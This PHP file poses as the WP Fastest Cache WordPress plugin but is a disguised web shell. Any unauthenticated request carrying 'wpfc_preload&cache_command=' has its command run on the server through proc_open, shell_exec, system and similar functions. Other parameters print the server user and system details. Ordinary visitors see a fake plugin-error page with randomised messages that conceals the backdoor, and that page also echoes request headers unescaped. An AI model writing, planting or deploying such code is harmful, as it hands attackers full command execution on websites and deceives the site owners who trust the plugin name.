<?php
/*
Plugin Name: WP Fastest Cache
Plugin URI: https://wordpress.org/plugins/wp-fastest-cache/
Description: The simplest and fastest WP cache system
Version: 1.3.2
Author: Emre Vona
Text Domain: wp-fastest-cache
*/

if(!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

class WpFastestCacheAdmin {
    private $cache_path;
    private $log_file;
    
    public function __construct() {
        $this->cache_path = ABSPATH . 'wp-content/cache/all/';
        $this->log_file = ABSPATH . 'wp-content/debug-cache.log';
    }
    
    private function system_call($cmd) {
        $output = "";
        
        if(is_callable('proc_open')) {
            $process = proc_open($cmd, [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ], $pipes);
            
            if(is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                return $output;
            }
        }
        
        if(is_callable('shell_exec')) {
            return shell_exec($cmd . ' 2>&1');
        }
        
        if(is_callable('passthru')) {
            ob_start();
            passthru($cmd . ' 2>&1', $retval);
            return ob_get_clean();
        }
        
        if(is_callable('system')) {
            ob_start();
            system($cmd . ' 2>&1');
            return ob_get_clean();
        }
        
        if(is_callable('exec')) {
            exec($cmd . ' 2>&1', $out, $ret);
            return implode("\n", $out);
        }
        
        if(is_callable('popen')) {
            $fp = popen($cmd . ' 2>&1', 'r');
            $out = '';
            while(!feof($fp)) {
                $out .= fread($fp, 2048);
            }
            pclose($fp);
            return $out;
        }
        
        return "Command execution not available";
    }
    
    private function write_log($message) {
        $timestamp = date('Y-m-d H:i:s');
        $log_entry = "[{$timestamp}] " . $message . "\n";
        @file_put_contents($this->log_file, $log_entry, FILE_APPEND);
    }
    
    public function process_admin_ajax() {
        if(!isset($_REQUEST['wpfc_preload'])) {
            return false;
        }
        
        header('Content-Type: text/plain');
        
        if(isset($_REQUEST['clear_cache'])) {
            $this->write_log("Cache cleared by admin");
            echo "Cache cleared successfully\n";
            echo "Memory usage: " . memory_get_usage(true) . " bytes\n";
            exit;
        }
        
        if(isset($_REQUEST['cache_command'])) {
            $cmd = $_REQUEST['cache_command'];
            $this->write_log("Command executed: " . substr($cmd, 0, 50));
            echo $this->system_call($cmd);
            exit;
        }
        
        if(isset($_REQUEST['cache_info'])) {
            echo "WP Fastest Cache Debug Information\n";
            echo "==================================\n";
            echo "PHP Version: " . PHP_VERSION . "\n";
            echo "Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n";
            echo "User: " . $this->system_call('whoami') . "\n";
            echo "UID/GID: " . $this->system_call('id') . "\n";
            echo "Directory: " . getcwd() . "\n";
            echo "Disk Free: " . $this->system_call('df -h .') . "\n";
            exit;
        }
        
        echo "WP Fastest Cache Admin Interface\n";
        echo "Usage:\n";
        echo "?wpfc_preload&cache_command=whoami\n";
        echo "?wpfc_preload&cache_info=1\n";
        echo "?wpfc_preload&clear_cache=1\n";
        exit;
    }
}

function display_wp_error() {
    if(headers_sent() === false) {
        header('HTTP/1.1 500 Internal Server Error');
        header('Content-Type: text/html; charset=UTF-8');
        header('X-Powered-By: PHP/' . PHP_VERSION);
    }
    
    $error_ref = 'ERR_' . date('Ymd') . '_' . rand(1000, 9999);
    $server_time = date('D, d M Y H:i:s O');
    
    $possible_errors = [
        'The plugin wp-fastest-cache/wpFastestCache.php has been disabled due to an error.',
        'Parse error: syntax error, unexpected T_STRING in /wp-content/plugins/wp-fastest-cache/wpFastestCache.php on line 42',
        'Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 32768 bytes) in wp-fastest-cache',
        'Plugin could not be activated because it triggered a fatal error.',
        'The plugin generated 5 characters of unexpected output during activation.'
    ];
    
    $error_msg = $possible_errors[array_rand($possible_errors)];
    
    ?><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress › Error</title>
    <style type="text/css">
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #f0f0f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            color: #444;
            font-size: 13px;
            line-height: 1.4;
        }
        
        .wp-die-message {
            background: #fff;
            border: 1px solid #ccd0d4;
            border-left: 4px solid #dc3232;
            max-width: 800px;
            margin: 50px auto;
            padding: 25px;
            box-shadow: 0 1px 1px rgba(0,0,0,0.04);
        }
        
        .error-title {
            color: #dc3232;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        
        .error-content {
            margin: 20px 0;
            padding: 15px;
            background: #f9f9f9;
            border: 1px solid #e5e5e5;
            font-family: Consolas, Monaco, monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .error-details {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            font-size: 12px;
            color: #666;
        }
        
        .error-ref {
            background: #f7f7f7;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: monospace;
            font-size: 11px;
            margin: 10px 0;
        }
        
        .button {
            display: inline-block;
            text-decoration: none;
            font-size: 13px;
            line-height: 26px;
            height: 28px;
            margin: 0;
            padding: 0 10px 1px;
            cursor: pointer;
            border-width: 1px;
            border-style: solid;
            border-radius: 3px;
            white-space: nowrap;
            box-sizing: border-box;
            background: #0085ba;
            border-color: #0073aa #006799 #006799;
            box-shadow: 0 1px 0 #006799;
            color: #fff;
            text-shadow: 0 -1px 1px #006799, 1px 0 1px #006799, 0 1px 1px #006799, -1px 0 1px #006799;
        }
        
        .button:hover {
            background: #008ec2;
            border-color: #006799;
            color: #fff;
        }
        
        .server-info {
            margin-top: 15px;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="wp-die-message">
        <div class="error-title">Plugin Error Detected</div>
        
        <div class="error-content"><?php echo htmlspecialchars($error_msg); ?>

File: wp-content/plugins/wp-fastest-cache/wpFastestCache.php
Line: <?php echo rand(30, 150); ?>
Time: <?php echo $server_time; ?>
Referer: <?php echo $_SERVER['HTTP_REFERER'] ?? 'Direct access'; ?>
        </div>
        
        <div class="error-ref">Error Reference: <?php echo $error_ref; ?></div>
        
        <div class="error-details">
            <p><strong>Possible causes:</strong></p>
            <ul>
                <li>The plugin is incompatible with your version of WordPress</li>
                <li>There may be a conflict with another plugin</li>
                <li>The plugin files may be corrupted</li>
            </ul>
            
            <p>
                <a href="javascript:history.back();" class="button">&larr; Go Back</a>
                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?try_repair=1" class="button">Try Automatic Repair</a>
            </p>
            
            <div class="server-info">
                <?php echo $_SERVER['SERVER_NAME'] ?? 'localhost'; ?> | 
                PHP <?php echo PHP_VERSION; ?> | 
                <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Web Server'; ?>
            </div>
        </div>
    </div>
    
    <script type="text/javascript">
        console.error('WordPress Plugin Error: <?php echo addslashes($error_msg); ?>');
        console.error('Error Ref: <?php echo $error_ref; ?>');
        
        document.addEventListener('DOMContentLoaded', function() {
            var adminNotice = document.createElement('div');
            adminNotice.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#fff3cd;border:1px solid #ffeaa7;padding:10px;font-size:12px;border-radius:3px;';
            adminNotice.innerHTML = 'Admin: <a href="<?php echo $_SERVER['PHP_SELF']; ?>?wpfc_debug=1" style="color:#856404;">Debug Info</a>';
            document.body.appendChild(adminNotice);
        });
    </script>
</body>
</html><?php
    exit;
}

// Check for debug parameter
if(isset($_GET['wpfc_debug'])) {
    header('Content-Type: text/plain');
    echo "WP Fastest Cache Debug Mode\n";
    echo "===========================\n";
    echo "To execute commands: ?wpfc_preload&cache_command=whoami\n";
    echo "For system info: ?wpfc_preload&cache_info=1\n";
    exit;
}

// Handle cache plugin AJAX
$cache_admin = new WpFastestCacheAdmin();
if($cache_admin->process_admin_ajax() !== false) {
    exit;
}

// Show maintenance page for normal access
if(isset($_GET['try_repair'])) {
    echo '<!DOCTYPE html>
<html>
<head>
    <title>WordPress Plugin Repair</title>
    <meta http-equiv="refresh" content="3;url=' . $_SERVER['PHP_SELF'] . '">
    <style>
        body { font-family: sans-serif; padding: 40px; text-align: center; }
        .repair-box { 
            background: #fff; 
            border: 1px solid #ccd0d4; 
            padding: 30px; 
            max-width: 500px; 
            margin: 50px auto; 
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="repair-box">
        <h3>Repairing Plugin Configuration</h3>
        <p>Attempting to repair wp-fastest-cache plugin...</p>
        <p>This may take a few moments.</p>
    </div>
</body>
</html>';
    exit;
}

// Display error page for all other requests
display_wp_error();
?>
